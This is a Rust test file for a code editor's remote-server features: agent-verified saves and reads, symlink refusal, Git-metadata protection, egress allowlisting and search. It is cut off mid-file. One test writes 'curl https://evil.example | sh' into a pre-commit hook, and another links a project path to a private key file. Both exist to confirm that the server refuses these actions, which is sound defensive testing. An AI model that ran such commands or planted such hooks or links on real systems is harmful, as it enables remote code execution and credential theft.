/// todo(windows)
/// The tests in this file assume that server_cx is running on Windows too.
/// We neead to find a way to test Windows-Non-Windows interactions.
use crate::headless_project::HeadlessProject;
use agent::{
    AgentTool, NativeAgent, NativeAgentConnection, ReadFileTool, ReadFileToolInput, SkillTool,
    SkillToolInput, SkillToolOutput, Templates, ThreadStore, ToolCallEventStream, ToolInput,
    skill_body_resolver_for_project, skills_resolver_for_project,
};
use client::{Client, UserStore};
use clock::FakeSystemClock;
use collections::{HashMap, HashSet};
use language_model::{LanguageModelRegistry, LanguageModelToolResultContent};
use languages::rust_lang;

use editor::{
    Editor, SelectionEffects,
    actions::{ConfirmCodeAction, ToggleCodeActions},
    code_context_menus::CodeContextMenu,
};
use extension::ExtensionHostProxy;
use fs::{FakeFs, Fs};
use git::{
    Oid,
    repository::{CommitData, GitCommitTemplate, RepoPath, Worktree as GitWorktree},
};
use gpui::{
    AppContext as _, Entity, ImageSource, IntoElement as _, SharedString, TestAppContext,
    UpdateGlobal, VisualContext, img, px, size,
};
use http_client::{BlockedHttpClient, FakeHttpClient};
use language::{
    BinaryStatus, Buffer, FakeLspAdapter, LanguageConfig, LanguageMatcher, LanguageRegistry,
    LineEnding, OffsetRangeExt, Point, PointUtf16,
    language_settings::{AllLanguageSettings, ConfiguredLanguageServer, LanguageSettings},
};
use lsp::{
    CompletionContext, CompletionResponse, CompletionTriggerKind, DEFAULT_LSP_REQUEST_TIMEOUT,
    LanguageServerId, LanguageServerName,
};
use node_runtime::NodeRuntime;
use project::{
    CompletionSource, LanguageServerLogType, LspStoreEvent, ProgressToken, Project, ProjectPath,
    agent_server_store::AgentServerCommand,
    image_store,
    lsp_store::{
        FormatTrigger, LspFormatTarget, OpenLspBufferHandle,
        log_store::{LanguageServerKind, LanguageServerLogKey, LogStore},
    },
    project_launch_approvals::{
        ExecutionHost, LaunchApprovalDetails, LaunchDefinitionFile, LaunchHost, LaunchKind,
        ProjectLaunchApprovals, ProjectLaunchApprovalsEvent,
    },
    search::{SearchQuery, SearchResult},
};
use remote::{ConnectionState, RemoteClient, RemoteClientEvent};
use rpc::{TypedEnvelope, proto};
use serde_json::json;
use settings::{
    Settings, SettingsLocation, SettingsStore, SplicingVec, initial_server_settings_content,
};
use smol::stream::StreamExt;
use std::{
    cell::RefCell,
    path::{Path, PathBuf},
    rc::Rc,
    str::FromStr,
    sync::{
        Arc,
        atomic::{AtomicBool, AtomicUsize, Ordering},
    },
    time::Duration,
};
use unindent::Unindent as _;
use util::{path, path_list::PathList, paths::PathMatcher, rel_path::rel_path};

/// ADR-F49: an agent's write to a remote project is verified by the remote
/// server itself. It writes exactly the buffer's path, and refuses once a
/// folder on the way has become a link there, whatever the client's view of
/// the worktree still shows.
#[gpui::test]
async fn test_remote_verified_save(cx: &mut TestAppContext, server_cx: &mut TestAppContext) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": { "src": { "lib.rs": "fn one() -> usize { 1 }" } },
            "outside": { "lib.rs": "outside" },
        }),
    )
    .await;

    let (project, _headless) = init_test(&fs, cx, server_cx).await;
    let (worktree, _) = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap();
    cx.executor().run_until_parked();
    let worktree_id = worktree.read_with(cx, |worktree, _| worktree.id());
    let buffer = project
        .update(cx, |project, cx| {
            project.open_buffer((worktree_id, rel_path("src/lib.rs")), cx)
        })
        .await
        .unwrap();

    buffer.update(cx, |buffer, cx| {
        buffer.edit([(0..0, "/* verified */ ")], None, cx);
    });
    project
        .update(cx, |project, cx| {
            project.save_buffer_verified(buffer.clone(), cx)
        })
        .await
        .unwrap();
    assert_eq!(
        fs.load(path!("/code/project1/src/lib.rs").as_ref())
            .await
            .unwrap(),
        "/* verified */ fn one() -> usize { 1 }"
    );
    assert!(buffer.read_with(cx, |buffer, _| !buffer.is_dirty()));

    fs.remove_dir(
        path!("/code/project1/src").as_ref(),
        fs::RemoveOptions {
            recursive: true,
            ignore_if_not_exists: false,
        },
    )
    .await
    .unwrap();
    fs.insert_symlink(
        path!("/code/project1/src"),
        PathBuf::from(path!("/code/outside")),
    )
    .await;
    buffer.update(cx, |buffer, cx| {
        buffer.edit([(0..0, "// pwned\n")], None, cx);
    });
    let error = project
        .update(cx, |project, cx| {
            project.save_buffer_verified(buffer.clone(), cx)
        })
        .await
        .unwrap_err();
    assert!(format!("{error:#}").contains("symbolic link"), "{error:#}");
    assert_eq!(
        fs.load(path!("/code/outside/lib.rs").as_ref())
            .await
            .unwrap(),
        "outside"
    );
}

/// ADR-F49 decision 11: what Zed reads for a sandboxed agent in a remote
/// project is checked on the remote host, which is where the links are — the
/// client's own view of the worktree cannot settle where a path leads there.
#[gpui::test]
async fn test_remote_verified_read(cx: &mut TestAppContext, server_cx: &mut TestAppContext) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": { "src": { "lib.rs": "fn one() -> usize { 1 }" } },
            "outside": { "id_rsa": "-----BEGIN" },
        }),
    )
    .await;
    fs.insert_symlink(
        path!("/code/project1/key"),
        PathBuf::from(path!("/code/outside/id_rsa")),
    )
    .await;

    let (project, _headless) = init_test(&fs, cx, server_cx).await;
    let (worktree, _) = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap();
    cx.executor().run_until_parked();
    let worktree_id = worktree.read_with(cx, |worktree, _| worktree.id());

    project
        .update(cx, |project, cx| {
            project.verify_agent_read(&(worktree_id, rel_path("src/lib.rs")).into(), cx)
        })
        .await
        .unwrap();

    let error = project
        .update(cx, |project, cx| {
            project.verify_agent_read(&(worktree_id, rel_path("key")).into(), cx)
        })
        .await
        .unwrap_err();
    assert!(format!("{error:#}").contains("symbolic link"), "{error:#}");
}

/// ADR-F49: the remote server refuses to write Git metadata in a verified save
/// by itself, even when the client's judgement of the write was skipped.
#[gpui::test]
async fn test_remote_verified_save_refuses_git_metadata(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                ".git": { "hooks": { "pre-commit": "#!/bin/sh\n" } },
                "src": { "lib.rs": "fn one() -> usize { 1 }" },
            },
        }),
    )
    .await;

    let (project, _headless) = init_test(&fs, cx, server_cx).await;
    let (worktree, _) = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap();
    cx.executor().run_until_parked();
    let worktree_id = worktree.read_with(cx, |worktree, _| worktree.id());
    let buffer = project
        .update(cx, |project, cx| {
            project.open_buffer((worktree_id, rel_path(".git/hooks/pre-commit")), cx)
        })
        .await
        .unwrap();

    buffer.update(cx, |buffer, cx| {
        buffer.edit([(0..0, "curl https://evil.example | sh # ")], None, cx);
    });
    let error = project
        .update(cx, |project, cx| {
            project.save_buffer_verified(buffer.clone(), cx)
        })
        .await
        .unwrap_err();
    assert!(format!("{error:#}").contains("Git metadata"), "{error:#}");
    assert_eq!(
        fs.load(path!("/code/project1/.git/hooks/pre-commit").as_ref())
            .await
            .unwrap(),
        "#!/bin/sh\n"
    );
}

#[gpui::test]
async fn test_basic_remote_editing(cx: &mut TestAppContext, server_cx: &mut TestAppContext) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                ".git": {},
                "README.md": "# project 1",
                "src": {
                    "lib.rs": "fn one() -> usize { 1 }"
                }
            },
            "project2": {
                "README.md": "# project 2",
            },
        }),
    )
    .await;
    fs.set_index_for_repo(
        Path::new(path!("/code/project1/.git")),
        &[("src/lib.rs", "fn one() -> usize { 0 }".into())],
    );

    let (project, _headless) = init_test(&fs, cx, server_cx).await;
    let (worktree, _) = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap();

    // The client sees the worktree's contents.
    cx.executor().run_until_parked();
    let worktree_id = worktree.read_with(cx, |worktree, _| worktree.id());
    worktree.update(cx, |worktree, _cx| {
        assert_eq!(
            worktree.paths().collect::<Vec<_>>(),
            vec![
                rel_path("README.md"),
                rel_path("src"),
                rel_path("src/lib.rs"),
            ]
        );
    });

    // The user opens a buffer in the remote worktree. The buffer's
    // contents are loaded from the remote filesystem.
    let buffer = project
        .update(cx, |project, cx| {
            project.open_buffer((worktree_id, rel_path("src/lib.rs")), cx)
        })
        .await
        .unwrap();
    let diff = project
        .update(cx, |project, cx| {
            project.open_unstaged_diff(buffer.clone(), cx)
        })
        .await
        .unwrap();

    diff.update(cx, |diff, cx| {
        assert_eq!(
            diff.base_text_string(cx).unwrap(),
            "fn one() -> usize { 0 }"
        );
    });

    buffer.update(cx, |buffer, cx| {
        assert_eq!(buffer.text(), "fn one() -> usize { 1 }");
        let ix = buffer.text().find('1').unwrap();
        buffer.edit([(ix..ix + 1, "100")], None, cx);
    });

    // The user saves the buffer. The new contents are written to the
    // remote filesystem.
    project
        .update(cx, |project, cx| project.save_buffer(buffer.clone(), cx))
        .await
        .unwrap();
    assert_eq!(
        fs.load("/code/project1/src/lib.rs".as_ref()).await.unwrap(),
        "fn one() -> usize { 100 }"
    );

    // A new file is created in the remote filesystem. The user
    // sees the new file.
    fs.save(
        path!("/code/project1/src/main.rs").as_ref(),
        &"fn main() {}".into(),
        Default::default(),
    )
    .await
    .unwrap();
    cx.executor().run_until_parked();
    worktree.update(cx, |worktree, _cx| {
        assert_eq!(
            worktree.paths().collect::<Vec<_>>(),
            vec![
                rel_path("README.md"),
                rel_path("src"),
                rel_path("src/lib.rs"),
                rel_path("src/main.rs"),
            ]
        );
    });

    // A file that is currently open in a buffer is renamed.
    fs.rename(
        path!("/code/project1/src/lib.rs").as_ref(),
        path!("/code/project1/src/lib2.rs").as_ref(),
        Default::default(),
    )
    .await
    .unwrap();
    cx.executor().run_until_parked();
    buffer.update(cx, |buffer, _| {
        assert_eq!(&**buffer.file().unwrap().path(), rel_path("src/lib2.rs"));
    });
    let renamed_buffer = project
        .update(cx, |project, cx| {
            project.open_buffer((worktree_id, rel_path("src/lib2.rs")), cx)
        })
        .await
        .unwrap();
    assert_eq!(renamed_buffer, buffer);

    fs.insert_file(
        path!("/code/project1/src/lib.rs"),
        b"fn two() -> usize { 2 }".to_vec(),
    )
    .await;
    cx.run_until_parked();

    let recreated_buffer = project
        .update(cx, |project, cx| {
            project.open_buffer((worktree_id, rel_path("src/lib.rs")), cx)
        })
        .await
        .unwrap();
    assert_ne!(recreated_buffer, buffer);
    recreated_buffer.read_with(cx, |buffer, _| {
        assert_eq!(&**buffer.file().unwrap().path(), rel_path("src/lib.rs"));
        assert_eq!(buffer.text(), "fn two() -> usize { 2 }");
    });
    buffer.read_with(cx, |buffer, _| {
        assert_eq!(&**buffer.file().unwrap().path(), rel_path("src/lib2.rs"));
        assert_eq!(buffer.text(), "fn one() -> usize { 100 }");
    });

    fs.set_index_for_repo(
        Path::new(path!("/code/project1/.git")),
        &[("src/lib2.rs", "fn one() -> usize { 100 }".into())],
    );
    cx.executor().run_until_parked();
    diff.update(cx, |diff, cx| {
        assert_eq!(
            diff.base_text_string(cx).unwrap(),
            "fn one() -> usize { 100 }"
        );
    });
}

#[gpui::test]
async fn test_remote_buffer_path_swap(cx: &mut TestAppContext, server_cx: &mut TestAppContext) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code/project"),
        json!({ "a.txt": "first", "b.txt": "second" }),
    )
    .await;
    let (project, headless) = init_test(&fs, cx, server_cx).await;
    let session = headless.read_with(server_cx, |headless, _| headless.session.clone());
    let (worktree, _) = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project"), true, cx)
        })
        .await
        .unwrap();
    let worktree_id = worktree.read_with(cx, |worktree, _| worktree.id());
    let first_buffer = project
        .update(cx, |project, cx| {
            project.open_buffer((worktree_id, rel_path("a.txt")), cx)
        })
        .await
        .unwrap();
    let second_buffer = project
        .update(cx, |project, cx| {
            project.open_buffer((worktree_id, rel_path("b.txt")), cx)
        })
        .await
        .unwrap();
    cx.run_until_parked();

    for updates in [
        [(&first_buffer, "b.txt"), (&second_buffer, "a.txt")],
        [(&second_buffer, "b.txt"), (&first_buffer, "a.txt")],
    ] {
        for (buffer, path) in updates {
            let message = buffer.read_with(cx, |buffer, cx| {
                let mut file = buffer.file().unwrap().to_proto(cx);
                file.path = path.to_owned();
                proto::UpdateBufferFile {
                    project_id: proto::REMOTE_SERVER_PROJECT_ID,
                    buffer_id: buffer.remote_id().to_proto(),
                    file: Some(file),
                }
            });
            session.send(message).unwrap();
            cx.run_until_parked();
        }
        for (buffer, path) in updates {
            buffer.read_with(cx, |buffer, _| {
                assert_eq!(&**buffer.file().unwrap().path(), rel_path(path));
            });
            project.read_with(cx, |project, cx| {
                assert_eq!(
                    project.get_open_buffer(&(worktree_id, rel_path(path)).into(), cx),
                    Some(buffer.clone())
                );
            });
        }
    }
}

#[gpui::test]
async fn test_remote_telemetry_event_forwarding(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    // This mirrors `init_test`, but retains the server-side session so the test
    // can drive a forwarded telemetry event over the proto channel (as
    // `init_telemetry_forwarding` does on a real remote server).
    let server_fs = FakeFs::new(server_cx.executor());
    server_fs
        .insert_tree(
            path!("/code"),
            json!({ "project1": { "README.md": "# project 1" } }),
        )
        .await;

    cx.update(|cx| release_channel::init(semver::Version::new(0, 0, 0), cx));
    server_cx.update(|cx| release_channel::init(semver::Version::new(0, 0, 0), cx));
    init_logger();

    let (opts, server_session, _) = RemoteClient::fake_server(cx, server_cx);
    let http_client = Arc::new(BlockedHttpClient);
    let node_runtime = NodeRuntime::unavailable();
    let languages = Arc::new(LanguageRegistry::new(cx.executor()));
    let proxy = Arc::new(ExtensionHostProxy::new());
    server_cx.update(HeadlessProject::init);
    let headless = server_cx.new(|cx| {
        HeadlessProject::new(
            crate::HeadlessAppState {
                session: server_session.clone(),
                fs: server_fs.clone(),
                http_client,
                node_runtime,
                languages,
                extension_host_proxy: proxy,
                startup_time: std::time::Instant::now(),
            },
            false,
            cx,
        )
    });

    let ssh = RemoteClient::connect_mock(opts, cx).await;
    let project = build_project(ssh, cx);
    project
        .update(cx, {
            let headless = headless.clone();
            |_, cx| cx.on_release(|_, _| drop(headless))
        })
        .detach();

    // The remote server forwards a bare `FlexibleEvent` as JSON; mirror that
    // here by sending the proto message the forwarding task would send.
    let event_json = json!({
        "event_type": "fs_watcher_poll",
        "event_properties": { "path": "/code/project1" },
    })
    .to_string();
    server_session
        .send(proto::TelemetryEvent {
            project_id: proto::REMOTE_SERVER_PROJECT_ID,
            event_json,
        })
        .unwrap();
    cx.executor().run_until_parked();

    let events = project.read_with(cx, |project, _| {
        project.client().telemetry().queued_events()
    });
    assert_eq!(
        events.len(),
        1,
        "the forwarded event should be reported once"
    );
    let event = &events[0];
    assert_eq!(event.event_type, "fs_watcher_poll");
    // The event's original properties survive the round-trip.
    assert_eq!(
        event.event_properties.get("path"),
        Some(&serde_json::Value::String("/code/project1".to_string()))
    );
    // The client stamps the remote host metadata it learned at connection time.
    // The mock connection reports a Linux/x86_64 host over a "mock" connection.
    assert_eq!(
        event.event_properties.get("remote"),
        Some(&serde_json::Value::Bool(true))
    );
    assert_eq!(
        event.event_properties.get("remote_connection_type"),
        Some(&serde_json::Value::String("mock".to_string()))
    );
    assert_eq!(
        event.event_properties.get("remote_os_name"),
        Some(&serde_json::Value::String("Linux".to_string()))
    );
    assert_eq!(
        event.event_properties.get("remote_architecture"),
        Some(&serde_json::Value::String("x86_64".to_string()))
    );
}

#[gpui::test]
async fn test_egress_allowlist_pushed_to_remote_server(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    // ADR-F11 (DESIGN.md §4): the connecting IDE's egress allowlist is the
    // source of truth and is pushed to `remote_server`'s own `HttpClient`
    // right after the connection is established.
    let server_fs = FakeFs::new(server_cx.executor());
    server_fs.insert_tree(path!("/code"), json!({})).await;

    cx.update(|cx| release_channel::init(semver::Version::new(0, 0, 0), cx));
    server_cx.update(|cx| release_channel::init(semver::Version::new(0, 0, 0), cx));
    init_logger();

    // Simulate the local IDE already having a non-empty allowlist before
    // this connection is made.
    let (client_policy, errors) =
        http_client::EgressPolicy::from_host_strings(["api.anthropic.com"]);
    assert!(errors.is_empty());
    cx.update(|cx| {
        cx.set_global(egress_policy::EgressAllowlistGlobal(
            http_client::EgressPolicyHandle::new(client_policy),
        ));
    });

    let (opts, server_session, _) = RemoteClient::fake_server(cx, server_cx);
    // Stand in for the `AllowlistedHttpClient` that wraps `remote_server`'s
    // real `ReqwestClient` (see `server.rs::execute_run`), so the test can
    // observe what the pushed allowlist did to it.
    let server_egress_policy = http_client::EgressPolicyHandle::default();
    let http_client = Arc::new(http_client::AllowlistedHttpClient::new(
        Arc::new(BlockedHttpClient),
        server_egress_policy.clone(),
    ));
    let node_runtime = NodeRuntime::unavailable();
    let languages = Arc::new(LanguageRegistry::new(cx.executor()));
    let proxy = Arc::new(ExtensionHostProxy::new());
    server_cx.update(HeadlessProject::init);
    let headless = server_cx.new(|cx| {
        HeadlessProject::new(
            crate::HeadlessAppState {
                session: server_session,
                fs: server_fs.clone(),
                http_client,
                node_runtime,
                languages,
                extension_host_proxy: proxy,
                startup_time: std::time::Instant::now(),
            },
            false,
            cx,
        )
    });

    let ssh = RemoteClient::connect_mock(opts, cx).await;
    let project = build_project(ssh, cx);
    project
        .update(cx, {
            let headless = headless.clone();
            |_, cx| cx.on_release(|_, _| drop(headless))
        })
        .detach();
    cx.executor().run_until_parked();

    let anthropic = http_client::RequestHost::parse("api.anthropic.com").expect("valid host");
    let openai = http_client::RequestHost::parse("api.openai.com").expect("valid host");
    assert!(
        server_egress_policy.allows(&anthropic),
        "the client's allowlist should have been pushed to the remote host on connect"
    );
    assert!(
        !server_egress_policy.allows(&openai),
        "hosts absent from the client's allowlist should stay denied on the remote host"
    );

    // ADR-F14: the same push carries the `proxy_child_processes` choice, and
    // an allowlisted remote host stands a supervisor up ready to act on it.
    assert!(
        headless.read_with(server_cx, |headless, _| headless
            .child_process_proxy
            .is_some()),
        "a remote host whose HTTP client is allowlisted should have a supervisor for it"
    );
    // This client never installed an egress policy of its own — no
    // `egress_policy::init` — so it asks for no proxy on the remote host, and
    // none is started. That is also what keeps this test from publishing a
    // process-wide endpoint the rest of the suite would then trip over.
    assert_eq!(
        http_client::child_process_proxy(),
        None,
        "a client that is not running the child-process proxy must not make the remote host run one"
    );
}

async fn do_search_and_assert(
    project: &Entity<Project>,
    query: &str,
    files_to_include: PathMatcher,
    match_full_paths: bool,
    expected_paths: &[&str],
    mut cx: TestAppContext,
) -> Vec<Entity<Buffer>> {
    let query = query.to_string();
    let receiver = project.update(&mut cx, |project, cx| {
        project.search(
            SearchQuery::text(
                query,
                false,
                true,
                false,
                files_to_include,
                Default::default(),
                match_full_paths,
                None,
            )
            .unwrap(),
            cx,
        )
    });

    let mut buffers = Vec::new();
    for expected_path in expected_paths {
        let buffer = loop {
            let response = receiver.rx.recv().await.unwrap();
            match response {
                SearchResult::Buffer { buffer, .. } => break buffer,
                SearchResult::LimitReached => panic!("incorrect result"),
                SearchResult::WaitingForScan | SearchResult::Searching => continue,
            }
        };
        buffer.update(&mut cx, |buffer, cx| {
            assert_eq!(
                buffer.file().unwrap().full_path(cx).to_string_lossy(),
                *expected_path
            )
        });
        buffers.push(buffer);
    }

    assert!(receiver.rx.recv().await.is_err());
    buffers
}

struct RemoteImageTestView {
    source: ImageSource,
}

impl gpui::Render for RemoteImageTestView {
    fn render(
        &mut self,
        _window: &mut gpui::Window,
        _cx: &mut gpui::Context<Self>,
    ) -> impl gpui::IntoElement {
        img(self.source.clone())
    }
}

#[gpui::test]
async fn test_remote_project_image_source(cx: &mut TestAppContext, server_cx: &mut TestAppContext) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project": {
                "docs": {
                    "image.ppm": "P3\n1 1\n255\n255 0 0\n"
                }
            }
        }),
    )
    .await;

    let (project, _headless) = init_test(&fs, cx, server_cx).await;
    let (worktree, _) = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project"), true, cx)
        })
        .await
        .expect("remote worktree should open");
    let worktree_id = worktree.read_with(cx, |worktree, _cx| worktree.id());
    let source = image_store::project_image_source(
        project.downgrade(),
        ProjectPath {
            worktree_id,
            path: rel_path("docs/image.ppm").into(),
        },
    );
    let ImageSource::Custom(load_image) = source else {
        panic!("expected a project-backed image source");
    };
    let loaded_bytes = Arc::new(std::sync::Mutex::new(None));
    let observed_source = ImageSource::from({
        let loaded_bytes = loaded_bytes.clone();
        move |window: &mut gpui::Window, cx: &mut gpui::App| {
            let result = load_image(window, cx);
            if let Some(Ok(image)) = &result {
                *loaded_bytes.lock().expect("loaded image mutex poisoned") =
                    image.as_bytes(0).map(ToOwned::to_owned);
            }
            result
        }
    });

    let (view, cx) = cx.add_window_view(|_window, _cx| RemoteImageTestView {
        source: observed_source,
    });
    cx.draw(Default::default(), size(px(10.), px(10.)), {
        let view = view.clone();
        move |_, _| view.into_any_element()
    });
    cx.run_until_parked();
    cx.draw(Default::default(), size(px(10.), px(10.)), move |_, _| {
        view.into_any_element()
    });

    assert_eq!(
        loaded_bytes
            .lock()
            .expect("loaded image mutex poisoned")
            .as_deref(),
        Some([0, 0, 255, 255].as_slice())
    );
}

#[gpui::test]
async fn test_remote_project_search(cx: &mut TestAppContext, server_cx: &mut TestAppContext) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                ".git": {},
                "README.md": "# project 1",
                "src": {
                    "lib.rs": "fn one() -> usize { 1 }"
                }
            },
        }),
    )
    .await;

    let (project, headless) = init_test(&fs, cx, server_cx).await;

    project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap();

    cx.run_until_parked();

    let buffers = do_search_and_assert(
        &project,
        "project",
        Default::default(),
        false,
        &[path!("project1/README.md")],
        cx.clone(),
    )
    .await;
    let buffer = buffers.into_iter().next().unwrap();

    // test that the headless server is tracking which buffers we have open correctly.
    cx.run_until_parked();
    headless.update(server_cx, |headless, cx| {
        assert!(headless.buffer_store.read(cx).has_shared_buffers())
    });
    do_search_and_assert(
        &project,
        "project",
        Default::default(),
        false,
        &[path!("project1/README.md")],
        cx.clone(),
    )
    .await;
    server_cx.run_until_parked();
    cx.update(|_| {
        drop(buffer);
    });
    cx.run_until_parked();
    server_cx.run_until_parked();
    headless.update(server_cx, |headless, cx| {
        assert!(!headless.buffer_store.read(cx).has_shared_buffers())
    });

    do_search_and_assert(
        &project,
        "project",
        Default::default(),
        false,
        &[path!("project1/README.md")],
        cx.clone(),
    )
    .await;
}

#[gpui::test]
async fn test_remote_project_search_single_cpu(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                ".git": {},
                "README.md": "# project 1",
                "src": {
                    "lib.rs": "fn one() -> usize { 1 }"
                }
            },
        }),
    )
    .await;

    // Simulate a single-CPU environment (e.g. a devcontainer with 1 visible CPU).
    // This causes the worker pool in project search to spawn num_cpus - 1 = 0 workers,
    // which silently drops all search channels and produces zero results.
    server_cx.executor().set_num_cpus(1);

    let (project, _) = init_test(&fs, cx, server_cx).await;

    project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap();

    cx.run_until_parked();

    do_search_and_assert(
        &project,
        "project",
        Default::default(),
        false,
        &[path!("project1/README.md")],
        cx.clone(),
    )
    .await;
}

#[gpui::test]
async fn test_remote_project_search_inclusion(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                "README.md": "# project 1",
            },
            "project2": {
                "README.md": "# project 2",
            },
        }),
    )
    .await;

    let (project, _) = init_test(&fs, cx, server_cx).await;

    project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap();

    project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project2"), true, cx)
        })
        .await
        .unwrap();

    cx.run_until_parked();

    // Case 1: Test search with path matcher limiting to only one worktree
    let path_matcher = PathMatcher::new(
        &["project1/*.md".to_owned()],
        util::paths::PathStyle::local(),
    )
    .unwrap();
    do_search_and_assert(
        &project,
        "project",
        path_matcher,
        true, // should be true in case of multiple worktrees
        &[path!("project1/README.md")],
        cx.clone(),
    )
    .await;

    // Case 2: Test search without path matcher, matching both worktrees
    do_search_and_assert(
        &project,
        "project",
        Default::default(),
        true, // should be true in case of multiple worktrees
        &[path!("project1/README.md"), path!("project2/README.md")],
        cx.clone(),
    )
    .await;
}

#[gpui::test]
async fn test_remote_project_search_reports_open_excluded_file_once(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                "aaa.rs": "fn needle_aa() {}",
                "mmm.rs": "fn needle_mm() {}",
                "zzz.rs": "fn needle_zz() {}",
            },
        }),
    )
    .await;

    let (project, _headless) = init_test(&fs, cx, server_cx).await;
    server_cx.update(|cx| {
        SettingsStore::update_global(cx, |store, cx| {
            store.update_user_settings(cx, |settings| {
                settings.project.worktree.file_scan_exclusions =
                    Some(SplicingVec::from(vec!["**/mmm.rs".to_string()]));
            });
        });
    });

    let (worktree, _) = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap();
    cx.run_until_parked();

    let worktree_id = worktree.read_with(cx, |worktree, _| worktree.id());
    let _excluded_buffer = project
        .update(cx, |project, cx| {
            project.open_buffer((worktree_id, rel_path("mmm.rs")), cx)
        })
        .await
        .unwrap();
    cx.run_until_parked();
    worktree.read_with(cx, |worktree, _| {
        assert_eq!(
            worktree
                .entry_for_path(rel_path("mmm.rs"))
                .map(|entry| entry.id),
            None,
            "mmm.rs must have no worktree entry for this test to be meaningful"
        );
    });

    do_search_and_assert(
        &project,
        "needle",
        Default::default(),
        false,
        &[
            path!("project1/aaa.rs"),
            path!("project1/mmm.rs"),
            path!("project1/zzz.rs"),
        ],
        cx.clone(),
    )
    .await;
}

#[gpui::test]
async fn test_remote_project_search_reports_untitled_buffer_once(
    cx: &mut TestAppContext,
    server_cx: &mut TestAppContext,
) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        path!("/code"),
        json!({
            "project1": {
                "aaa.rs": "fn needle_aa() {}",
            },
        }),
    )
    .await;

    let (project, _headless) = init_test(&fs, cx, server_cx).await;
    let (_worktree, _) = project
        .update(cx, |project, cx| {
            project.find_or_create_worktree(path!("/code/project1"), true, cx)
        })
        .await
        .unwrap();
    cx.run_until_parked();

    let untitled_buffer = project
        .update(cx, |project, cx| project.create_buffer(None, true, cx))
        .await
        .unwrap();
    untitled_buffer.update(cx, |buffer, cx| {
        buffer.edit([(0..0, "fn needle_untitled() {}")], None, cx)
    });
    cx.run_until_parked();

    let receiver = project.update(cx, |project, cx| {
        project.search(
            SearchQuery::text(
                "needle",
                false,
                true,
                false,
                Default::default(),
                Default::default(),
                false,
                None,
            )
            .unwrap(),
            cx,
        )
    });
    let mut result_buffers = Vec::new();
    while let Ok(result) = receiver.rx.recv().await {
        match result {
            SearchResult::Buffer { buffer, .. } => result_buffers.push(buffer),
            SearchResult::LimitReached => panic!("unexpected limit"),
            SearchResult::WaitingForScan | SearchResult::Searching => {}
        }
    }
    assert_eq!(
        result_buffers
            .iter()
            .filter(|buffer| **buffer == untitled_buffer)
            .count(),
        1,
        "an untitled buffer on a remote project must be searched by the server only, \
         not once per side"
    );
    assert_eq!(result_buffers.len(), 2);
}

#[gpui::test]
async fn test_remote_settings(cx: &mut TestAppContext, server_cx: &mut TestAppContext) {
    let fs = FakeFs::new(server_cx.executor());
    fs.insert_tree(
        "/code",
        json!({
            "project1": {
                ".git": {},
                "README.md": "# project 1",
                "src": {
                    "lib.rs": "fn one() -> usize { 1 }"
                }
            },
        }),
    )
    .await;

    let (project, headless) = init_test(&fs, cx, server_cx).await;

    cx.update_global(|settings_store: &mut SettingsStore, cx| {
        settings_store.set_user_settings(
            r#"{"languages":{"Rust":{"language_servers":["from-local-settings"]}}}"#,
            cx,
        )
    })
    .unwrap();

    cx.run_until_parked();

    server_cx.read(|cx| {
        assert_eq!(
            AllLanguageSettings::get_global(cx)
                .language(None, Some(&"Rust".into()), cx)
                .language_servers,
            [ConfiguredLanguageServer::new("from-local-settings")],
            "User language settings should be synchronized with the server settings"
        )
    });

    server_cx
        .update_global(|settings_store: &mut SettingsStore, cx| {
            settings_store.set_server_settings(
                r#"{"languages":{"Rust":{"language_servers":["from-server-settings"]}}}"#,
                cx,
            )
        })
        .unwrap();

    cx.run_until_parked();

    server_cx.read(|cx| {
        assert_eq!(
            AllLanguageSettings::get_global(cx)
                .language(None, Some(&"Rust".into()), cx)
                .language_servers,
            [ConfiguredLanguageServer::new("from-server-settings")],
            "Server language settings should take precedence over the user settings"
        )
    });

    fs.insert_tree(
        "/code/project1/.zed",
        json!({
            "settings.json": r#"
                  {
                    "languages": {"Rust":{"language_servers":["override-rust-analyzer"]}},
                    "lsp": {
                      "override-rust-analyzer": {
                        "binary": {
